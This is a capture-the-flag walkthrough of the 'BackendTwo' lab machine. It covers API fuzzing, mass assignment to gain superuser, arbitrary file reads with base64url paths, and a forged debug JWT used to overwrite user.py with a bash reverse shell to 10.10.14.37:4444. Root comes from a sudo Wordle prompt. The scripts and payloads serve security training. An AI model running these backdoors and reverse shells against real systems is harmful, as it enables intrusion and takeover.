## BackendTwo

### Lab Details 

- Difficulty: Medium
- Type: Web Enumeration, API Enumeration, Abusing APIs, Priv Esc, Linux

#### Enumeration
```bash
$ feroxbuster -u http://10.129.227.139 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -d2
                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.227.139
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       22c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        3w       22c http://10.129.227.139/
401      GET        1l        2w       30c http://10.129.227.139/docs
200      GET        1l        1w       19c http://10.129.227.139/api

```

```bash
$ ffuf -u http://10.129.227.139/api/v1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.227.139/api/v1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 24ms]

```

![[admin endpoint.png]]
![[admin user.png]]
- enumerate by `id` there are 11 users
![[user sign up.png]]
- create a new user using the `login` endpoint
```bash
$ curl -v -s -X POST -d '{"email": "attacker1@backendtwo.htb", "password": "attack"}' http://10.129.227.139/api/v1/user/signup -H "Content-Type: application/json"
*   Trying 10.129.227.139:80...
* Connected to 10.129.227.139 (10.129.227.139) port 80 (#0)
> POST /api/v1/user/signup HTTP/1.1
> Host: 10.129.227.139
> User-Agent: curl/7.88.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 59
> 
< HTTP/1.1 201 Created
< date: Mon, 08 Sep 2025 18:25:43 GMT
< server: uvicorn
< content-length: 2
< content-type: application/json
< 
* Connection #0 to host 10.129.227.139 left intact
```
- attempt to login with the user created but need to update the data format as `login` endpoint expect data to be formatted differently
```bash
 curl -X POST http://10.129.227.139/api/v1/user/login -d 'username=attacker1@backendtwo.htb&password=attack' | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   351  100   302  100    49    657    106 --:--:-- --:--:-- --:--:--   764
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzU4MDQ3MTUzLCJpYXQiOjE3NTczNTU5NTMsInN1YiI6IjEzIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6ImJkODA1ZDBhLWU5NTAtNGEyOC1hMGIzLTgzMmZjMTU5N2RiOCJ9.xFqQ0qD0ryWnxWF7W5ONqseUaE4L26k0YTz6Cq-0dEg",
  "token_type": "bearer"
}
```
- we get a JWT token as response which then we can use it to authentication to `docs` endpoint as it requires authentication upon visit
- tools we can use to facilitate (Modify Header Value (HTTP Headers))
- config the as below
![[injecting JWT into header using plugin.png]]
- this doesnt not work because when the request gets sent to the server, the server send back a response to client to make a request to `/openapi.json` we also need to add the JWT token to that request as well else we get an authentication error
![[injecting JWT into header using burpsuite.png]]
- get documentation page on `FastAPI`
![[fastapi doc.png]]
- there are few methods available we can attempt perform mass assignment on user edit endpoint
- before mass assignment
```json
$ curl http://10.129.227.139/api/v1/user/13
{"guid":"bd805d0a-e950-4a28-a0b3-832fc1597db8","email":"attacker1@backendtwo.htb","profile":null,"last_update":null,"time_created":1757355943640,"is_superuser":false,"id":13}
```
- perform mass assignment, adding `is_superuser` to the request
- note that we still need to inject the JWT token as the method require authentication
![[mass injection.png]]
- after mass assignment
```json
$ curl http://10.129.227.139/api/v1/user/13 | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   178  100   178    0     0   6433      0 --:--:-- --:--:-- --:--:--  6592
{
  "guid": "bd805d0a-e950-4a28-a0b3-832fc1597db8",
  "email": "attacker1@backendtwo.htb",
  "profile": "attack!",
  "last_update": null,
  "time_created": 1757355943640,
  "is_superuser": true,
  "id": 13
}
```
- however still unable to execute the `get flag` endpoint
- attempt to perform login again, getting a new token and checked with `/admin` endpoint getting admin is true
![[admin access updated.png]]
- attempt to update admin's password, changed to `attack!`
![[attempt with updating admin password.png]]
- however unable to authenticate as admin
```json
$ curl -X POST http://10.129.227.139/api/v1/user/login -d 'username=admin@backendtwo.htb&password=attack!' | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    89  100    43  100    46     67     72 --:--:-- --:--:-- --:--:--   140
{
  "detail": "Incorrect username or password"
}
```
- fortunately was able to get user flag using the `get_user_flag` endpoint
#### Initial Foothold 
- use the `file/{file_name}` get file endpoint
- enumerate files on remote server
- investigate `/etc/passwd` using `cyberchef` `base64_url` to encode special characters
```json
$ curl -X 'GET' 'http://10.129.227.139/api/v1/admin/file/L2V0Yy9wYXNzd2Q' \
-H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzU4MDQ5OTg2LCJpYXQiOjE3NTczNTg3ODYsInN1YiI6IjEzIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYmQ4MDVkMGEtZTk1MC00YTI4LWEwYjMtODMyZmMxNTk3ZGI4In0.ypB6K6QbY7EVEbGYLIt7IDcl7q-SZ3yTPomxMKRv9pU'
{"file":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\n"}
```
- we can see that user `htb` has login shell
- on the `FastAPI` page there is an endpoint for write to file
- we can attempt to write a revere shell on the server and get a connection, we can trigger the connection by injecting the reverse shell into the `user.py` 
- use below script to read file from remote 

```bash
#!/bin/bash

TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzU4MDQ5OTg2LCJpYXQiOjE3NTczNTg3ODYsInN1YiI6IjEzIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYmQ4MDVkMGEtZTk1MC00YTI4LWEwYjMtODMyZmMxNTk3ZGI4In0.ypB6K6QbY7EVEbGYLIt7IDcl7q-SZ3yTPomxMKRv9pU

b64url=$(echo -n $1 | base64 | tr '/+' '_-' | tr -d '=')

curl -s http://10.129.227.139/api/v1/admin/file/${b64url} -H "Authorization: Bearer $TOKEN" | jq .file -r
```
- check the environment variable file, we see that it mentions the app module location at `app/main.py`
```bash
$ cat environ 
USER=htbHOME=/home/htbOLDPWD=/PORT=80LOGNAME=htbJOURNAL_STREAM=9:19628APP_MODULE=app.main:appPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=e2959d0c773c47bab691a790d70de414LANG=C.UTF-8API_KEY=68b329da9893e34099c7d8ad5cb9c940HOST=0.0.0.0PWD=/home/htb
```
- then the `app.py` file, we can see that the main is importing some functions from other modules 
- one of the modules that we are interested in is `from app.api.v1.api import api_router`
```python
$ ./getfile.sh app/main.py > main.py && cat ./main.py
import asyncio
import os

with open('pid','w') as f:
    f.write( str(os.getpid())  )

from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.openapi.docs import get_swagger_ui_html
from fastapi.openapi.utils import get_openapi



from typing import Optional, Any
from pathlib import Path
from sqlalchemy.orm import Session



from app.schemas.user import User
from app.api.v1.api import api_router
from app.core.config import settings

from app.api import deps
from app import crud

## <snip>
```
- get `app/api/v1/api.py`
```bash
$ ./getfile.sh app/api/v1/api.py > api.py && cat ./api.py 
from fastapi import APIRouter

from app.api.v1.endpoints import user, admin


api_router = APIRouter()
api_router.include_router(user.router, prefix="/user", tags=["user"])
api_router.include_router(admin.router, prefix="/admin", tags=["admin"])

```
- from that we get the location of user and admin app file on the remote server
![[debug and key required.png]]
- the `write file` endpoint requires `debug` parameter to be included in the JWT token as well the `API key`, `API key` can be obtained from the `environ` file 
- update the JWT token as request then we can write to the server via the file write endpoint
![[modified jwt token.png]]
- append below to `user.py` as we are going to replace the origin file with the one that has a reverse shell in it and we are using delete endpoint for the reverse shell  and declaring the functionality of that function which in this case executes a python reverse shell
```python
@router.delete("/ShellMe", status_code=200)
def shell() -> Any:
    """
    Reverse Shell
    """
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.37/4444 0>&1'")
    return
```
- use below script to write file to remote
```bash
#!/bin/bash

TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzU4MDQ5OTg2LCJpYXQiOjE3NTczNTg3ODYsInN1YiI6IjEzIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYmQ4MDVkMGEtZTk1MC00YTI4LWEwYjMtODMyZmMxNTk3ZGI4IiwiZGVidWciOnRydWV9.8P8-VBvAHHJrp-U2s5CUXSLkFcQDLWg7_UqPcf2nMbc

b64url=$(echo -n "app/api/v1/endpoints/user.py" | base64 | tr '/+' '_-' | tr -d '=')

curl -s -X POST http://10.129.227.139/api/v1/admin/file/${b64url} -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"file\":\"$(cat user_escaped)\"}" | jq .result -r
```

- view the `docs` and the delete endpoint has been added
- execute the function and we get a reverse shell on the `nc` listener

![[delete function added.png]]
![[reverse shell.png]]
#### Lateral Movement (If any)

#### Privilege Escalation
- load and run `linpeas.sh`
```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.

--- Attempt 1 of 6 ---
```
- we see that its able to pick up on a program called `pam-wordle` from `sudo -l`
- checking `~/auth.log` and found an interesting string attempt `ssh` with the password and worked
```bash
htb@BackendTwo:~$ cat auth.log 
09/08/2025, 16:32:26 - Login Success for admin@htb.local
09/08/2025, 16:35:46 - Login Success for admin@htb.local
09/08/2025, 16:49:06 - Login Success for admin@htb.local
09/08/2025, 16:52:26 - Login Success for admin@htb.local
09/08/2025, 16:57:26 - Login Success for admin@htb.local
09/08/2025, 17:00:46 - Login Success for admin@htb.local
09/08/2025, 17:14:06 - Login Success for admin@htb.local
09/08/2025, 17:22:26 - Login Success for admin@htb.local
09/08/2025, 17:24:06 - Login Success for admin@htb.local
09/08/2025, 17:30:46 - Login Success for admin@htb.local
09/08/2025, 17:39:06 - Login Failure for 1qaz2wsx_htb!
09/08/2025, 17:40:41 - Login Success for admin@htb.local
<snip>
```
- search for `pam-wordle` and found the file, using `strings` and found the location of word-list used by the program
```bash
htb@BackendTwo:~$ find / -name "*wordle*" 2>/dev/null
htb@BackendTwo:~$ strings /usr/lib/x86_64-linux-gnu/security/pam_wordle.so
Q`^B
DICT
fetch_word
regcomp
fopen
strlen
regexec
fgets
fclose
check_word
strncmp
wordle_guess
pam_prompt
pam_sm_authenticate
time
srand
pam_sm_setcred
pam_sm_acct_mgmt
AWAVAUATSH
[A\A]A^A_]
linu
^[abcdefghijklmnopqrstuvwxyz]{5}$
Word: 
Invalid guess: unknown word.
Warning: error reading dictionary.
Invalid guess: guess length != word length.
Correct!
Hint->%s
--- Welcome to PAM-Wordle! ---
A five character [a-z] word has been selected.
You have %d attempts to guess the word.
After each guess you will recieve a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.
--- Attempt %d of %d ---
You lose.
The word was: %s
;*3$"
/opt/.words
<snip>
```
- the content of the wordlist, we can use grep to search for hints
```bash
htb@BackendTwo:~$ cat /opt/.words
write
close
fstat
<snip>
```
- play the game and once the correct word guessed we get to run all as root
```bash
$ sudo -l
[sudo] password for htb: 
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.

--- Attempt 1 of 6 ---
Word: cheat
Hint->??*?*
--- Attempt 2 of 6 ---
Word: hacks
Hint->????s
--- Attempt 3 of 6 ---
Word: setns
Correct!
Matching Defaults entries for htb on backendtwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb may run the following commands on backendtwo:
    (ALL : ALL) ALL
```
#### Resources

#### Lesson Learned
- API Enumeration
- API Abusing